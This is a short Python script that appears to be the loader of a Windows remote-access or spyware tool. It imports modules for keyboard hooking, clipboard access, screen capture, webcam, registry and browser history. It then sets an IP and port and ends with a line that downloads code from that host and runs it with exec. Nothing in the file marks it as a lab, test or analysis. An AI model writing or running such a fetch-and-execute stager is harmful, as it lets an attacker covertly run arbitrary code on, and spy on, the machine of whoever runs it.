import os
import time
import winreg
import socket
import threading
import requests
import win32api,win32con
import win32clipboard
import sys
import ctypes
import pyautogui
import subprocess
import PySimpleGUI
import platform
import webbrowser
import shutil
import cv2
import numpy as np
import string
import easygui
import browserhistory
from prettytable import PrettyTable
import threading
import keyboard
ip = "192.168.3.24"
port = 6666
exec(requests.get('http://'+ip+':5000/code').text)